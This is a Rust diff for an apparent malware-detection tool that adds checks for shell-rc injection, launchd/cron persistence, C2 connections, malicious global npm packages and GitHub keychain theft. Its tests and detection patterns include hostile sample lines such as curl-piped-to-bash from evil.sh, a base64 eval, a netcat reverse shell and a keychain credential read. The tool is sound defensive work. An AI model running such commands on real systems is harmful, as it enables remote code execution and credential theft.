@@ -8,7 +8,7 @@
 
 use std::path::{Path, PathBuf};
 
-use wormward_packs::polinrider_fingerprint;
+use wormward_packs::{polinrider_fingerprint, polinrider_pack};
 
 /// Payloads are small; skip huge cache blobs and cap how many files we walk.
 const MAX_CACHE_FILES: usize = 20_000;
@@ -47,6 +47,16 @@ pub struct Unscanned {
     pub reason: String,
 }
 
+/// A machine-level indicator outside the caches/processes/triggers buckets: shell-rc injection, a
+/// persistence item (launchd/cron), a live C2 connection, an installed malicious global package, or
+/// keychain-theft process activity. `category` groups them for rendering.
+#[derive(Debug, PartialEq, serde::Serialize)]
+pub struct MachineHit {
+    pub category: String,
+    pub target: String,
+    pub reason: String,
+}
+
 /// Aggregated machine-check results.
 #[derive(Debug, serde::Serialize)]
 pub struct DoctorReport {
@@ -58,6 +68,9 @@ pub struct DoctorReport {
     pub cache_dirs: Vec<PathBuf>,
     /// Roots that exist but could not be read — blind spots, not "clean".
     pub unscanned: Vec<Unscanned>,
+    /// Deep-hygiene hits: persistence, live C2 connections, shell-rc injection, global packages,
+    /// keychain-theft — each an active-compromise indicator.
+    pub machine: Vec<MachineHit>,
 }
 
 impl DoctorReport {
@@ -66,7 +79,10 @@ impl DoctorReport {
     /// infection, so they don't fail the run; an unscanned root does, because a blind spot must
     /// never be reported as clean.
     pub fn has_findings(&self) -> bool {
-        !self.processes.is_empty() || !self.caches.is_empty() || !self.unscanned.is_empty()
+        !self.processes.is_empty()
+            || !self.caches.is_empty()
+            || !self.unscanned.is_empty()
+            || !self.machine.is_empty()
     }
 }
 
@@ -99,6 +115,7 @@ pub fn check() -> DoctorReport {
         triggers: audit_triggers(),
         cache_dirs,
         unscanned,
+        machine: scan_machine(),
     }
 }
 
@@ -366,6 +383,234 @@ pub fn fix_triggers() -> Vec<String> {
     done
 }
 
+// ---- deep machine hygiene (persistence, network, shell-rc, global packages, keychain) ----
+
+const KNOWN_MALICIOUS_PLISTS: &[&str] = &["com.bablu.helper"];
+
+/// True (with a reason) when a shell line looks like an injected fetch-and-run / decoder. Literal
+/// token co-occurrence only (no regex dep), kept FP-conservative: a bare `curl` or `base64` is
+/// fine; it takes the fetch+pipe-to-shell / decode+exec / reverse-shell shapes, or the loader
+/// fingerprint, to fire. Used for shell-rc files and crontab lines.
+pub fn suspicious_shell_line(line: &str) -> Option<String> {
+    let l = line.trim();
+    if l.starts_with('#') || l.is_empty() {
+        return None;
+    }
+    let has_fetch = l.contains("curl ") || l.contains("wget ");
+    let pipe_sh =
+        l.contains("| sh") || l.contains("|sh") || l.contains("| bash") || l.contains("|bash");
+    if has_fetch && pipe_sh {
+        return Some("fetch piped to a shell".into());
+    }
+    if l.contains("base64") && (l.contains("eval") || pipe_sh) {
+        return Some("base64-decoded code executed".into());
+    }
+    if l.contains("nc -e") {
+        return Some("netcat reverse shell".into());
+    }
+    if polinrider_fingerprint(l).is_some() {
+        return Some("loader fingerprint".into());
+    }
+    None
+}
+
+/// Scan shell-rc file `(path, content)` pairs for injected startup commands. Pure/testable.
+pub fn scan_shell_rc(files: &[(PathBuf, String)]) -> Vec<MachineHit> {
+    let mut hits = Vec::new();
+    for (path, content) in files {
+        for line in content.lines() {
+            if let Some(reason) = suspicious_shell_line(line) {
+                let snippet = line.trim().chars().take(80).collect::<String>();
+                hits.push(MachineHit {
+                    category: "shell-rc".into(),
+                    target: path.display().to_string(),
+                    reason: format!("{reason}: {snippet}"),
+                });
+            }
+        }
+    }
+    hits
+}
+
+/// Scan launchd plist / crontab `(path, content)` pairs for loader-launching persistence. Pure.
+pub fn scan_persistence(items: &[(PathBuf, String)]) -> Vec<MachineHit> {
+    let mut hits = Vec::new();
+    for (path, content) in items {
+        let ps = path.to_string_lossy();
+        if KNOWN_MALICIOUS_PLISTS.iter().any(|m| ps.contains(m)) {
+            hits.push(MachineHit {
+                category: "persistence".into(),
+                target: ps.to_string(),
+                reason: "known malicious LaunchAgent".into(),
+            });
+            continue;
+        }
+        let lc = content.to_lowercase();
+        if lc.contains("openclaw") || lc.contains("polinrider") {
+            hits.push(MachineHit {
+                category: "persistence".into(),
+                target: ps.to_string(),
+                reason: "references PolinRider/openclaw tooling".into(),
+            });
+            continue;
+        }
+        for line in content.lines() {
+            if let Some(reason) = suspicious_shell_line(line) {
+                hits.push(MachineHit {
+                    category: "persistence".into(),
+                    target: ps.to_string(),
+                    reason,
+                });
+                break;
+            }
+        }
+    }
+    hits
+}
+
+/// Match live-connection lines (lsof/netstat output) against known C2 hosts/IPs. Pure.
+pub fn scan_connections(conn_lines: &[String], c2: &[String]) -> Vec<MachineHit> {
+    let mut hits = Vec::new();
+    for line in conn_lines {
+        for host in c2 {
+            if !host.is_empty() && line.contains(host.as_str()) {
+                hits.push(MachineHit {
+                    category: "connection".into(),
+                    target: host.clone(),
+                    reason: format!("live network connection to C2 {host}"),
+                });
+            }
+        }
+    }
+    hits
+}
+
+/// Match globally-installed package names against the malicious list. Pure.
+pub fn scan_global_packages(installed: &[String], bad: &[String]) -> Vec<MachineHit> {
+    installed
+        .iter()
+        .filter(|p| bad.iter().any(|b| b == *p))
+        .map(|p| MachineHit {
+            category: "global-package".into(),
+            target: p.clone(),
+            reason: "malicious package installed globally".into(),
+        })
+        .collect()
+}
+
+/// Flag processes reading the GitHub keychain credential (`find-internet-password … github`). Pure.
+pub fn scan_keychain_procs(procs: &[(u32, String)]) -> Vec<MachineHit> {
+    procs
+        .iter()
+        .filter(|(_, cmd)| cmd.contains("find-internet-password") && cmd.contains("github"))
+        .map(|(pid, _)| MachineHit {
+            category: "keychain".into(),
+            target: format!("pid {pid}"),
+            reason: "reading the GitHub keychain credential (credential theft)".into(),
+        })
+        .collect()
+}
+
+/// Known C2 hosts/IPs for the network check — pulled live from the PolinRider pack (ioc_domains +
+/// hardcoded exfil IPs), so it stays in sync with the catalog. Community entries are excluded.
+fn c2_hosts() -> Vec<String> {
+    let pack = wormward_packs::polinrider_pack();
+    let mut hosts = pack.manifest.ioc_domains.clone();
+    for sig in &pack.manifest.content_signatures {
+        if sig.id.starts_with("c2-exfil-ip") || sig.id == "c2-ethereum-ip" {
+            hosts.push(sig.value.clone());
+        }
+    }
+    hosts
+}
+
+/// Read the shell-rc files that a login shell sources, as `(path, content)` pairs.
+fn shell_rc_files() -> Vec<(PathBuf, String)> {
+    let home = home_dir();
+    [".zshrc", ".bashrc", ".bash_profile", ".profile", ".zshenv", ".zprofile"]
+        .iter()
+        .filter_map(|f| {
+            let p = home.join(f);
+            std::fs::read_to_string(&p).ok().map(|c| (p, c))
+        })
+        .collect()
+}
+
+/// Read launchd plists + crontab as `(path, content)` pairs.
+fn persistence_items() -> Vec<(PathBuf, String)> {
+    let home = home_dir();
+    let mut items = Vec::new();
+    let dirs = [
+        home.join("Library/LaunchAgents"),
+        PathBuf::from("/Library/LaunchAgents"),
+        PathBuf::from("/Library/LaunchDaemons"),
+    ];
+    for dir in dirs {
+        if let Ok(entries) = std::fs::read_dir(&dir) {
+            for e in entries.flatten() {
+                let p = e.path();
+                if p.extension().and_then(|x| x.to_str()) == Some("plist") {
+                    if let Ok(c) = std::fs::read_to_string(&p) {
+                        items.push((p, c));
+                    }
+                }
+            }
+        }
+    }
+    if let Ok(o) = std::process::Command::new("crontab").arg("-l").output() {
+        if o.status.success() {
+            items.push((PathBuf::from("crontab"), String::from_utf8_lossy(&o.stdout).into_owned()));
+        }
+    }
+    items
+}
+
+/// Live established TCP connections (one line per connection) via `lsof`.
+fn tcp_connection_lines() -> Vec<String> {
+    match std::process::Command::new("lsof").args(["-nP", "-iTCP", "-sTCP:ESTABLISHED"]).output() {
+        Ok(o) if o.status.success() => {
+            String::from_utf8_lossy(&o.stdout).lines().map(String::from).collect()
+        }
+        _ => Vec::new(),
+    }
+}
+
+/// Globally-installed package names via `npm ls -g` (and pnpm if present).
+fn global_package_names() -> Vec<String> {
+    let mut names = Vec::new();
+    for tool in ["npm", "pnpm"] {
+        if tool == "pnpm" && !command_exists("pnpm") {
+            continue;
+        }
+        if let Ok(o) =
+            std::process::Command::new(tool).args(["ls", "-g", "--depth=0", "--parseable"]).output()
+        {
+            for line in String::from_utf8_lossy(&o.stdout).lines() {
+                if let Some(idx) = line.rfind("node_modules/") {
+                    let name = &line[idx + "node_modules/".len()..];
+                    if !name.is_empty() {
+                        names.push(name.to_string());
+                    }
+                }
+            }
+        }
+    }
+    names
+}
+
+/// Run every deep-hygiene detector against the live machine. Read-only.
+pub fn scan_machine() -> Vec<MachineHit> {
+    let procs = list_processes();
+    let bad = wormward_packs::polinrider_pack().manifest.bad_npm_packages.clone();
+    let mut hits = Vec::new();
+    hits.extend(scan_shell_rc(&shell_rc_files()));
+    hits.extend(scan_persistence(&persistence_items()));
+    hits.extend(scan_connections(&tcp_connection_lines(), &c2_hosts()));
+    hits.extend(scan_global_packages(&global_package_names(), &bad));
+    hits.extend(scan_keychain_procs(&procs));
+    hits
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -427,6 +672,72 @@ mod tests {
     }
 
     #[test]
+    fn shell_rc_flags_injection_not_benign_lines() {
+        let files = vec![(
+            PathBuf::from("/home/u/.zshrc"),
+            "export PATH=$PATH:/usr/local/bin\n# comment\nalias g=git\ncurl -s https://evil.sh | bash\nsource ~/.nvm/nvm.sh\n".to_string(),
+        )];
+        let hits = scan_shell_rc(&files);
+        assert_eq!(hits.len(), 1, "only the curl|bash line should fire, got {hits:?}");
+        assert_eq!(hits[0].category, "shell-rc");
+    }
+
+    #[test]
+    fn suspicious_shell_line_conservative() {
+        assert!(suspicious_shell_line("curl https://x | sh").is_some());
+        assert!(suspicious_shell_line("eval \"$(base64 -d <<< ...)\"").is_some());
+        assert!(suspicious_shell_line("nc -e /bin/sh 1.2.3.4 4444").is_some());
+        // Benign lines must stay quiet.
+        assert!(suspicious_shell_line("curl -O https://example.com/file.tar.gz").is_none());
+        assert!(suspicious_shell_line("export EDITOR=vim").is_none());
+        assert!(suspicious_shell_line("# curl x | bash").is_none());
+    }
+
+    #[test]
+    fn persistence_flags_malicious_plist_and_openclaw() {
+        let items = vec![
+            (PathBuf::from("/Library/LaunchAgents/com.bablu.helper.plist"), "<plist></plist>".to_string()),
+            (PathBuf::from("/Users/u/Library/LaunchAgents/x.plist"), "ProgramArguments openclaw".to_string()),
+            (PathBuf::from("/Users/u/Library/LaunchAgents/ok.plist"), "<plist>com.apple.something</plist>".to_string()),
+        ];
+        let hits = scan_persistence(&items);
+        assert_eq!(hits.len(), 2, "known plist + openclaw ref, not the benign one, got {hits:?}");
+    }
+
+    #[test]
+    fn connections_match_c2_hosts() {
+        let conns = vec![
+            "node 123 u 12u IPv4 TCP 10.0.0.2:5050->166.88.54.158:443 (ESTABLISHED)".to_string(),
+            "node 124 u 13u IPv4 TCP 10.0.0.2:5051->140.82.112.3:443 (ESTABLISHED)".to_string(),
+        ];
+        let hits = scan_connections(&conns, &["166.88.54.158".to_string()]);
+        assert_eq!(hits.len(), 1);
+        assert_eq!(hits[0].target, "166.88.54.158");
+    }
+
+    #[test]
+    fn global_packages_and_keychain() {
+        let installed = vec!["typescript".to_string(), "tailwind-stylecss".to_string()];
+        let bad = vec!["tailwind-stylecss".to_string()];
+        assert_eq!(scan_global_packages(&installed, &bad).len(), 1);
+
+        let procs = vec![
+            (1, "/usr/bin/security find-generic-password -s login".to_string()),
+            (2, "security find-internet-password -s github.com".to_string()),
+        ];
+        let kc = scan_keychain_procs(&procs);
+        assert_eq!(kc.len(), 1);
+        assert_eq!(kc[0].category, "keychain");
+    }
+
+    #[test]
+    fn c2_hosts_sourced_from_pack() {
+        let hosts = c2_hosts();
+        assert!(hosts.iter().any(|h| h == "166.88.54.158"), "exfil IP must be a C2 host");
+        assert!(hosts.iter().any(|h| h.ends_with(".vercel.app")), "vercel C2 domains included");
+    }
+
+    #[test]
     fn unreadable_root_fails_clean() {
         // An unscanned root is the worst case (a silent false CLEAN); has_findings must be true.
         let report = DoctorReport {
@@ -435,6 +746,7 @@ mod tests {
             triggers: vec![],
             cache_dirs: vec![],
             unscanned: vec![Unscanned { path: PathBuf::from("/blocked"), reason: "x".into() }],
+            machine: vec![],
         };
         assert!(report.has_findings(), "an unscanned root must not certify clean");
     }
